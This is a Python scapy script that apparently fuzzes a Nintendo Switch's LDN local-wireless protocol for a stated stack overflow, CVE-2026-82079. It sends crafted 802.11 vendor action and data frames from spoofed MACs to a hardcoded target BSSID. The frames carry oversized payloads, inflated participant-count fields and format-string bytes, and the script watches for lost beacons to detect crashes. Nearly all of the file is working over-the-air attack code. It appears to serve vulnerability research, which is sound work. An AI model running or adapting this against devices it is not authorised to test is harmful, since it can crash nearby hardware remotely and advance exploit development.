#!/usr/bin/env python3
"""
LDN (Local Device Network) action frame fuzzer for CVE-2026-82079.

The Switch uses Nintendo's LDN protocol over WiFi for local multiplayer
and "Send to Smartphone" features. LDN operates through:
  1. WiFi management frames (beacons with Nintendo vendor IEs)
  2. WiFi action frames (vendor-specific, OUI 00:22:aa)
  3. WiFi data frames (once associated)

CVE-2026-82079 is a stack-based buffer overflow in the LDN code that
processes these frames. This fuzzer targets the Nintendo vendor action
frame pathway, which is likely where the overflow occurs.

Theory: The LDN sysmodule allocates a fixed-size stack buffer for
incoming network data (action frame IE payloads, management frame IEs,
or data frame payloads) and copies without bounds checking.

Requires:
    - scapy (pip install scapy)
    - Root privileges (sudo)
    - WiFi interface in monitor mode on channel 1
    - Switch in "Send to Smartphone" mode

Usage:
    sudo python3 -I ldn_action_frame_fuzzer.py --iface wlp5s0
    sudo python3 -I ldn_action_frame_fuzzer.py --iface wlp5s0 --dry-run
    sudo python3 -I ldn_action_frame_fuzzer.py --iface wlp5s0 --tests action
"""

import argparse
import json
import os
import signal
import struct
import subprocess
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

try:
    from scapy.all import (
        Dot11, Dot11Elt, Dot11Action, Dot11Beacon,
        RadioTap, sendp, sniff, conf, Raw,
    )
except ImportError:
    print("scapy is required: pip install scapy")
    sys.exit(1)

SWITCH_BSSID = "ec:c4:0d:f3:dc:db"
SWITCH_SSID = "switch_F3DCDB0100S"
SWITCH_CHANNEL = 1
NINTENDO_OUI = b"\x00\x22\xaa"
BROADCOM_OUI = b"\x00\x10\x18"
BEACON_WAIT = 2.0
INTER_TEST_PAUSE = 0.3

EVIDENCE_DIR = Path(__file__).parent.parent / "evidence" / "ldn_action_results"


def evidence_dir():
    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
    return EVIDENCE_DIR


def save_result(name, data):
    path = evidence_dir() / f"{name}.json"
    with open(path, "w") as f:
        json.dump(data, f, indent=2, default=str)


def log(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] {msg}")


def run_cmd(cmd, check=True):
    return subprocess.run(cmd, capture_output=True, text=True, check=check)


def setup_monitor(phy_iface, mon_iface):
    log(f"Setting up monitor interface {mon_iface} from {phy_iface}")
    try:
        result = run_cmd(["iw", "dev", phy_iface, "info"])
        phy = None
        for line in result.stdout.splitlines():
            if "wiphy" in line:
                phy = "phy" + line.strip().split()[-1]
                break
        if not phy:
            return False
    except subprocess.CalledProcessError:
        return False

    run_cmd(["iw", "dev", mon_iface, "del"], check=False)
    try:
        run_cmd(["iw", phy, "interface", "add", mon_iface, "type", "monitor"])
        run_cmd(["ip", "link", "set", mon_iface, "up"])
        run_cmd(["iw", "dev", mon_iface, "set", "channel", str(SWITCH_CHANNEL)])
    except subprocess.CalledProcessError as e:
        log(f"  Failed: {e.stderr}")
        return False
    log(f"  Monitor {mon_iface} up on channel {SWITCH_CHANNEL}")
    return True


def teardown_monitor(mon_iface):
    run_cmd(["ip", "link", "set", mon_iface, "down"], check=False)
    run_cmd(["iw", "dev", mon_iface, "del"], check=False)


def random_mac():
    import random
    octets = [random.randint(0, 255) for _ in range(6)]
    octets[0] = (octets[0] | 0x02) & 0xFE
    return ":".join(f"{b:02x}" for b in octets)


def check_ap_alive(mon_iface, timeout=BEACON_WAIT):
    result = {"alive": False, "elapsed": 0.0}
    t0 = time.monotonic()

    def is_switch_beacon(pkt):
        if pkt.haslayer(Dot11Beacon):
            addr2 = pkt[Dot11].addr2
            if addr2 and addr2.lower() == SWITCH_BSSID:
                return True
        return False

    try:
        pkts = sniff(iface=mon_iface, timeout=timeout,
                     lfilter=is_switch_beacon, count=1)
        result["elapsed"] = round(time.monotonic() - t0, 4)
        result["alive"] = bool(pkts)
    except Exception as e:
        result["error"] = str(e)
        result["elapsed"] = round(time.monotonic() - t0, 4)
    return result


# ═══════════════════════════════════════════════════════════
# Action Frame builders
# ═══════════════════════════════════════════════════════════

# WiFi Action Frame categories and subcategories
ACTION_CAT_VENDOR = 127  # Vendor-specific action frame


def build_vendor_action(src_mac, oui, action_type, payload):
    """Build a vendor-specific action frame.

    802.11 Action frame format:
      - Category: 127 (vendor-specific)
      - OUI: 3 bytes
      - OUI Type/Subtype: varies
      - Payload: vendor-defined
    """
    action_body = bytes([ACTION_CAT_VENDOR]) + oui + bytes([action_type]) + payload
    frame = (
        RadioTap()
        / Dot11(type=0, subtype=13,  # Action frame
                addr1=SWITCH_BSSID,
                addr2=src_mac,
                addr3=SWITCH_BSSID)
        / Raw(load=action_body)
    )
    return frame


def build_nintendo_action(src_mac, action_type, payload):
    """Build a Nintendo vendor-specific action frame."""
    return build_vendor_action(src_mac, NINTENDO_OUI, action_type, payload)


def build_data_frame_with_payload(src_mac, payload):
    """Build a WiFi data frame with arbitrary payload (for post-association fuzzing)."""
    frame = (
        RadioTap()
        / Dot11(type=2, subtype=0,  # Data frame
                addr1=SWITCH_BSSID,
                addr2=src_mac,
                addr3=SWITCH_BSSID,
                FCfield=0x01)  # To DS
        / Raw(load=payload)
    )
    return frame


# ═══════════════════════════════════════════════════════════
# LDN Protocol structures (reverse-engineered from beacons)
# ═══════════════════════════════════════════════════════════

def build_ldn_scan_response(session_id=1, participant_count=1, extra_data=b""):
    """Build a fake LDN scan response payload.

    Based on the Nintendo IE format seen in beacons (OUI 00:22:aa type 0x10).
    The beacon carries: type=0x10, data=[0x01, 0x01]
    This suggests a versioned protocol: version=1, type=1.
    """
    payload = struct.pack("<BBH", 0x01, 0x01, session_id)  # version, type, session_id
    payload += struct.pack("<H", participant_count)
    payload += extra_data
    return payload


def build_ldn_connect_request(network_id=0, extra_data=b""):
    """Build a fake LDN connect request payload."""
    payload = struct.pack("<BBI", 0x01, 0x02, network_id)  # version, type=connect, network_id
    payload += extra_data
    return payload


# ═══════════════════════════════════════════════════════════
# Test cases
# ═══════════════════════════════════════════════════════════

def action_frame_tests():
    """Nintendo vendor-specific action frame test cases."""
    tests = []

    # --- Baseline: minimal Nintendo action frame ---
    mac = random_mac()
    tests.append(("action_nintendo_baseline",
                  build_nintendo_action(mac, 0x10, b"\x01\x01")))

    # --- Various action types (0x00-0x1F scan) ---
    for atype in [0x00, 0x01, 0x02, 0x03, 0x04, 0x0F, 0x10, 0x11, 0x20, 0x30, 0xFF]:
        mac = random_mac()
        tests.append((f"action_nintendo_type_{atype:02x}",
                      build_nintendo_action(mac, atype, b"\x01\x01")))

    # --- Oversized payloads for each likely action type ---
    for size in [64, 128, 255, 512, 1024, 2000]:
        mac = random_mac()
        payload = b"\xCC" * size
        tests.append((f"action_nintendo_t10_payload_{size}B",
                      build_nintendo_action(mac, 0x10, payload)))

    # --- LDN scan response with oversized participant list ---
    for count in [10, 100, 1000, 65535]:
        mac = random_mac()
        fake_participants = b"\xDD" * (count * 8)  # 8 bytes per fake participant
        payload = build_ldn_scan_response(
            session_id=0x4141,
            participant_count=count,
            extra_data=fake_participants[:min(len(fake_participants), 2000)]
        )
        tests.append((f"action_ldn_scan_resp_{count}_participants",
                      build_nintendo_action(mac, 0x10, payload)))

    # --- LDN connect request with oversized extra data ---
    for size in [64, 256, 512, 1024, 2000]:
        mac = random_mac()
        payload = build_ldn_connect_request(
            network_id=0xDEADBEEF,
            extra_data=b"\xBB" * size
        )
        tests.append((f"action_ldn_connect_{size}B_extra",
                      build_nintendo_action(mac, 0x02, payload)))

    # --- Integer overflow in length fields ---
    mac = random_mac()
    payload = struct.pack("<BBH", 0x01, 0x01, 0xFFFF)  # max session_id
    payload += struct.pack("<H", 0xFFFF)  # claim 65535 participants
    payload += b"\xAA" * 32  # but only provide 32 bytes
    tests.append(("action_ldn_participant_count_overflow",
                  build_nintendo_action(mac, 0x10, payload)))

    # --- Null-heavy payload (may confuse string parsing) ---
    mac = random_mac()
    payload = b"\x00" * 255
    tests.append(("action_nintendo_all_nulls",
                  build_nintendo_action(mac, 0x10, payload)))

    # --- Format string characters in payload ---
    mac = random_mac()
    payload = b"%s" * 50 + b"%n" * 20
    tests.append(("action_nintendo_fmtstr",
                  build_nintendo_action(mac, 0x10, payload)))

    return tests


def broadcom_action_tests():
    """Broadcom vendor-specific action frame tests (targeting WiFi driver)."""
    tests = []

    # Broadcom uses OUI 00:10:18 for proprietary features
    for atype in [0x01, 0x02, 0x03, 0x04, 0xFF]:
        mac = random_mac()
        tests.append((f"action_broadcom_type_{atype:02x}",
                      build_vendor_action(mac, BROADCOM_OUI, atype, b"\x00" * 16)))

    # Oversized Broadcom action frame
    for size in [128, 512, 1024, 2000]:
        mac = random_mac()
        tests.append((f"action_broadcom_payload_{size}B",
                      build_vendor_action(mac, BROADCOM_OUI, 0x02, b"\xEE" * size)))

    return tests


def data_frame_tests():
    """Raw data frame tests (simulating post-association traffic)."""
    tests = []

    # Oversized data frames
    for size in [256, 512, 1024, 1500, 2000, 2346]:
        mac = random_mac()
        tests.append((f"data_frame_{size}B",
                      build_data_frame_with_payload(mac, b"\xDD" * size)))

    # Data frame with LDN-like header
    mac = random_mac()
    ldn_header = struct.pack("<BBHIH", 0x01, 0x03, 0x4141, 0xDEADBEEF, 2048)
    payload = ldn_header + b"\xCC" * 2048
    tests.append(("data_frame_ldn_oversized",
                  build_data_frame_with_payload(mac, payload)))

    return tests


# ═══════════════════════════════════════════════════════════
# Test runner
# ═══════════════════════════════════════════════════════════

def run_test(name, frame, mon_iface, dry_run=False):
    src_mac = frame[Dot11].addr2 if frame.haslayer(Dot11) else "unknown"
    frame_bytes = bytes(frame)

    result = {
        "name": name,
        "src_mac": src_mac,
        "frame_size": len(frame_bytes),
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }

    if dry_run:
        result["dry_run"] = True
        log(f"  [DRY] {name}: {len(frame_bytes)}B frame")
        return result

    try:
        sendp(frame, iface=mon_iface, verbose=False)
        result["sent"] = True
    except Exception as e:
        result["sent"] = False
        result["send_error"] = str(e)
        log(f"  FAIL {name}: {e}")
        return result

    time.sleep(INTER_TEST_PAUSE)
    liveness = check_ap_alive(mon_iface)
    result["ap_alive_after"] = liveness["alive"]

    if not liveness["alive"]:
        log(f"  !!! {name}: AP NOT beaconing! Possible crash!")
        result["possible_crash"] = True
    else:
        log(f"  OK {name}: {len(frame_bytes)}B sent, AP alive")

    return result


def run_suite(test_cases, suite_name, mon_iface, dry_run=False):
    log(f"\n{'=' * 50}")
    log(f"Suite: {suite_name} ({len(test_cases)} tests)")
    log(f"{'=' * 50}")

    if not dry_run:
        liveness = check_ap_alive(mon_iface)
        if not liveness["alive"]:
            log("AP not detected. Is Switch in Send to Smartphone mode?")
            return [{"error": "AP not detected"}]

    results = []
    for name, frame in test_cases:
        result = run_test(name, frame, mon_iface, dry_run)
        results.append(result)

        if result.get("possible_crash"):
            log("Stopping — AP may have crashed")
            time.sleep(3)
            recheck = check_ap_alive(mon_iface, timeout=3.0)
            result["recheck_alive"] = recheck["alive"]
            if recheck["alive"]:
                log("  AP recovered — continuing")
            else:
                log("  AP still down — stopping suite")
                break

    save_result(suite_name, {
        "suite": suite_name,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "mon_iface": mon_iface,
        "dry_run": dry_run,
        "tests": results,
        "summary": {
            "total": len(results),
            "sent": sum(1 for r in results if r.get("sent")),
            "possible_crashes": sum(1 for r in results if r.get("possible_crash")),
        }
    })
    return results


def main():
    parser = argparse.ArgumentParser(
        description="LDN action frame fuzzer for CVE-2026-82079")
    parser.add_argument("--iface", default="wlp5s0",
                        help="Physical WiFi interface")
    parser.add_argument("--mon-iface", default=None,
                        help="Monitor interface name")
    parser.add_argument("--skip-setup", action="store_true",
                        help="Use existing monitor interface")
    parser.add_argument("--tests", choices=["all", "action", "broadcom", "data"],
                        default="all", help="Test suites to run")
    parser.add_argument("--dry-run", action="store_true",
                        help="Build frames only, don't send")
    args = parser.parse_args()

    if os.geteuid() != 0 and not args.dry_run:
        print("Root required. Run with sudo.")
        sys.exit(1)

    mon_iface = args.mon_iface or (args.iface + "mon")
    created_mon = False
    conf.verb = 0

    def cleanup(signum=None, frame=None):
        if created_mon and not args.skip_setup:
            teardown_monitor(mon_iface)
        sys.exit(0)

    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    log("LDN Action Frame Fuzzer — CVE-2026-82079")
    log(f"Target: {SWITCH_SSID} ({SWITCH_BSSID}) channel {SWITCH_CHANNEL}")

    if not args.skip_setup and not args.dry_run:
        if not setup_monitor(args.iface, mon_iface):
            sys.exit(1)
        created_mon = True

    try:
        all_results = {}

        if args.tests in ("all", "action"):
            cases = action_frame_tests()
            all_results["action"] = run_suite(
                cases, "nintendo_action_frames", mon_iface, dry_run=args.dry_run)

        if args.tests in ("all", "broadcom"):
            cases = broadcom_action_tests()
            all_results["broadcom"] = run_suite(
                cases, "broadcom_action_frames", mon_iface, dry_run=args.dry_run)

        if args.tests in ("all", "data"):
            cases = data_frame_tests()
            all_results["data"] = run_suite(
                cases, "data_frames", mon_iface, dry_run=args.dry_run)

        log(f"\n{'=' * 50}")
        log("SUMMARY")
        total_crashes = 0
        for sname, results in all_results.items():
            crashes = sum(1 for r in results if r.get("possible_crash"))
            total_crashes += crashes
            log(f"  {sname}: {len(results)} tests, {crashes} crashes")
        log(f"  Total crashes: {total_crashes}")
        log(f"{'=' * 50}")

    finally:
        if created_mon and not args.skip_setup:
            teardown_monitor(mon_iface)


if __name__ == "__main__":
    main()
